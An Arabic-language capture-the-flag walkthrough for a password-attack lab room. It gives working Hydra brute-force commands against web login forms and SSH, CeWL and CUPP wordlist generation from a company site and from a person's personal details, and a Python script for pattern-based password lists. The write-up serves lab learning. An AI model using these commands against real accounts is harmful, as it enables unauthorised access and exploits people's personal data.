<div dir="rtl" align="right">

# 🎯 CTF Playbook: Password Attacks
**ملخص اختراق روم (Checkmate) - تقنيات الهندسة العكسية لكلمات المرور والاختراق العنيف**

---

## المرحلة الأولى: هجوم Hydra الأساسي (بورت 5001)
الهدف: اختراق فورم تسجيل الدخول باستخدام قاموس جاهز (`rockyou.txt`).

### 🔍 خطوات الاستخراج من الـ HTML:
* **المسار (Action):** `/login`
* **حقول الإدخال (Parameters):** `username` و `password`
* **رسالة الفشل (Failure String):** `Invalid credentials.`

### ⚔️ أمر الاختراق (Hydra Command):
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 5001 <TARGET_IP> http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials."
```
المرحلة الثانية: صناعة قاموس من الموقع بأداة CeWL (بورت 5002)
الهدف: التلميح ذكر أن الهدف يستخدم "كلمات شائعة تخص الشركة". القواميس الجاهزة لن تفيد هنا، يجب سحب الكلمات من الموقع مباشرة.

# سحب الكلمات من واجهة الموقع (تأكد من استخدام الدومين الصحيح أو البورت الذي يحتوي على النصوص):
cewl [http://jobs.thm](http://jobs.thm) -w company_words.txt

hydra -l marco -P company_words.txt -s 5002 jobs.thm http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials."

المرحلة الثالثة: استهداف البيانات الشخصية بأداة CUPP (بورت 5003)
الهدف: التلميح أشار إلى استخدام "تفاصيل ماركو الشخصية". وجدنا في صفحة (Profile) التفاصيل التالية: (الاسم: Marco، اللقب: Bianchi، الدلع: marky، المواليد: 14021995).

🔍 توليد القاموس المخصص:
شغل أداة CUPP التفاعلية، وقم بإدخال البيانات الشخصية عندما يُطلب منك ذلك.

# تشغيل الأداة:
```
cupp -i
```
# ملاحظة: تأكد من اختيار (Y) عند السؤال عن إضافة أرقام ورموز خاصة في نهاية الكلمات.

hydra -l marco -P marco.txt -s 5003 social.thm http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials."

المرحلة الرابعة: هندسة القواميس المتقدمة بالـ Python (الـ SSH)
الهدف: كشف التلميح الأخير أن ماركو يستخدم نمطاً ثابتاً: (كلمة شركة + أول حرف كبير + سنة + علامة تعجب !). لاختراق خدمة الـ SSH، سنقوم ببرمجة سكريبت لتطبيق هذا النمط على ملف كلمات الشركة.

```
import os

input_file = 'company_words.txt' 
output_file = 'marco_ssh_pass.txt'
years = ['2023', '2024', '2025', '2026']

with open(input_file, 'r') as f_in, open(output_file, 'w') as f_out:
    words = f_in.read().splitlines()
    for word in words:
        if len(word) > 3:
            # تكبير أول حرف
            capitalized_word = word.capitalize() 
            # دمج الكلمة مع السنة وعلامة التعجب
            for year in years:
                password = f"{capitalized_word}{year}!"
                f_out.write(password + '\n')

print("[+] Wordlist Generated Successfully!")
```

hydra -l marco -P marco_ssh_pass.txt ssh://<TARGET_IP>
